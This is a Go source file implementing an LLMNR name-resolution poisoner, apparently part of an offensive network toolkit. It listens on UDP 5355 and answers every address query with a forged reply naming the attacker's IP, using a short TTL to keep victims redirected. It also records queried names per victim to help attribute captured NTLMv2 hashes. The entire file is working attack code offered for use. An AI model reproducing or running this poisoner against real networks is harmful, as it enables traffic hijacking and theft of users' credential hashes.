// Package llmnr implements an LLMNR (RFC 4795) name-resolution poisoner used
// to capture NTLMv2 hashes and misdirect victims whose DNS lookups fail.
package llmnr

import (
	"fmt"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/miekg/dns"

	"github.com/qyvora/toha3ee/internal/events"
	"github.com/qyvora/toha3ee/internal/store"
)

// Responder answers LLMNR queries for names that failed DNS resolution,
// claiming every queried name belongs to the attacker.
type Responder struct {
	attackerIP net.IP // IP advertised as the answer for every queried name
	bus        *events.Bus
	db         *store.Store

	conn     *net.UDPConn
	stop     chan struct{} // closed by Stop to unblock the read loop
	wg       sync.WaitGroup
	stopOnce sync.Once

	Queries  atomic.Int64 // queries parsed
	Poisoned atomic.Int64 // poisoned replies sent
}

// New returns an idle responder that claims names for attackerIP.
func New(attackerIP net.IP, bus *events.Bus, db *store.Store) *Responder {
	return &Responder{attackerIP: attackerIP, bus: bus, db: db, stop: make(chan struct{})}
}

// Start binds UDP :5355 and begins answering queries. Callers should run
// Stop() in a deferred cleanup.
func (r *Responder) Start() error {
	// LLMNR listens on UDP port 5355 (RFC 4795 §2.3); binding 0.0.0.0 accepts
	// both the 224.0.0.252 multicast queries and unicast retries.
	addr := &net.UDPAddr{IP: net.IPv4zero, Port: 5355}
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return fmt.Errorf("llmnr bind :5355: %w", err)
	}
	r.conn = conn
	r.wg.Add(1)
	go r.loop()
	return nil
}

// Stop closes the listener and waits for the read loop to exit.
func (r *Responder) Stop() {
	// Closing the socket is what actually unblocks ReadFromUDP; do both
	// exactly once so a deferred Stop plus signal-handler Stop is safe.
	r.stopOnce.Do(func() {
		close(r.stop)
		if r.conn != nil {
			_ = r.conn.Close()
		}
	})
	r.wg.Wait()
}

// loop reads datagrams until stopped and poisons each query.
func (r *Responder) loop() {
	defer r.wg.Done()
	buf := make([]byte, 4096)
	for {
		select {
		case <-r.stop:
			return
		default:
		}
		// A short read deadline polls the stop channel even on a quiet link,
		// so shutdown is prompt without relying on socket wake-ups.
		_ = r.conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, src, err := r.conn.ReadFromUDP(buf)
		if err != nil {
			continue // deadline hit or socket closed; re-check stop
		}
		r.handle(buf[:n], src)
	}
}

// handle poisons one LLMNR query: it writes the forged reply, records the
// queried name against the source host and emits a log event.
func (r *Responder) handle(pkt []byte, src *net.UDPAddr) {
	resp, name := r.buildResponse(pkt)
	if resp == nil {
		return // not a poisonable query (response, non-A/AAAA, malformed)
	}
	if _, err := r.conn.WriteToUDP(resp, src); err != nil {
		return
	}
	r.Poisoned.Add(1)
	if r.db != nil {
		// Remember which hostname the victim asked about; useful for later
		// hash capture attribution.
		if ip := net.ParseIP(src.IP.String()); ip != nil {
			if h := r.db.Host(ip); h != nil {
				h.Name = name
			}
		}
	}
	if r.bus != nil {
		r.bus.Emit(events.TopicLog, fmt.Sprintf("llmnr.poison: %s from %s -> %s", name, src.IP, r.attackerIP))
	}
}

// buildResponse parses an LLMNR query and returns the poison reply plus the
// queried name, or nil when the packet is not poisonable.
func (r *Responder) buildResponse(pkt []byte) ([]byte, string) {
	// LLMNR wire format is DNS-compatible, so miekg/dns handles the parsing.
	msg := new(dns.Msg)
	if err := msg.Unpack(pkt); err != nil {
		return nil, "" // not valid DNS/LLMNR
	}
	// Only queries (not responses) and only those carrying a question.
	if msg.Response || len(msg.Question) == 0 {
		return nil, ""
	}
	r.Queries.Add(1)

	q := msg.Question[0]
	name := strings.ToLower(strings.TrimSuffix(q.Name, "."))
	if q.Qtype != dns.TypeA && q.Qtype != dns.TypeAAAA {
		return nil, "" // we can only spoof address records
	}

	reply := new(dns.Msg)
	reply.SetReply(msg)
	reply.Authoritative = true
	// Echo the queried name and type back with the attacker's address, using
	// a short TTL so the victim re-resolves and stays pointed at us.
	if q.Qtype == dns.TypeAAAA {
		reply.Answer = append(reply.Answer, &dns.AAAA{
			Hdr:  dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: 30},
			AAAA: r.attackerIP.To16(),
		})
	} else {
		reply.Answer = append(reply.Answer, &dns.A{
			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 30},
			A:   r.attackerIP.To4(),
		})
	}

	out, err := reply.Pack()
	if err != nil {
		return nil, ""
	}
	return out, name
}
